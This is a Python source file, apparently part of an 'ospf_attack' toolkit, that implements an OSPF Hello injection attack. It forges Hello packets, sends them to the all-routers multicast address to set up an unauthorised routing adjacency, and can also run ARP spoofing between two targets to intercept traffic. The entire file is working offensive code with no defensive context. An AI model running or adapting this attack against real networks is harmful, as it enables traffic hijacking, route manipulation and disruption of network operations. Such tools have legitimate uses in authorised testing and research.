from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import HelloInjectionConfig
from ospf_attack.core.packet import build_hello_packet, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class HelloInjectAttack(BaseAttack):
    name = "hello-inject"
    description = "嗅探合法 Hello 后注入伪造 Hello 建立未授权邻接关系"
    category = AttackCategory.ADJACENCY
    needs_repeated = True
    config: HelloInjectionConfig

    def __init__(self, config: HelloInjectionConfig):
        super().__init__(config)
        self._sniffed_params = None
        self._arp_engine = None

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        if self.config.sniff_mode.value == "arp_spoof":
            from ospf_attack.core.arp_spoof import ArpSpoofEngine
            self._arp_engine = ArpSpoofEngine(
                iface=self.config.iface,
                target_a=self.config.arp_target_a,
                target_b=self.config.arp_target_b,
                interval=self.config.arp_interval,
            )
            self._arp_engine.start()

        self._sniffed_params = {
            "netmask": self.config.subnet_mask,
            "hello_interval": self.config.hello_interval,
            "dead_interval": self.config.router_dead_interval,
            "area_id": self.config.area_id,
            "auth_type": 0,
            "auth_key": b"",
        }

    def send_one_round(self) -> bool:
        src_ip = getattr(self, "_src_ip", None)
        if src_ip is None:
            from ospf_attack.network.adapter import get_local_ip
            src_ip = get_local_ip(self.config.iface)
            self._src_ip = src_ip
        pkt = build_hello_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=self._src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            router_priority=self.config.router_priority,
            hello_interval=self._sniffed_params["hello_interval"],
            router_dead_interval=self._sniffed_params["dead_interval"],
        )
        return self._sender.send_raw(pkt)

    def launch(self) -> AttackResult:
        # Single-shot fallback
        ok = self.send_one_round()
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Hello 注入: Router ID={self.config.router_id}, Priority={self.config.router_priority}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 1

    def teardown(self) -> None:
        if self._arp_engine:
            self._arp_engine.stop()
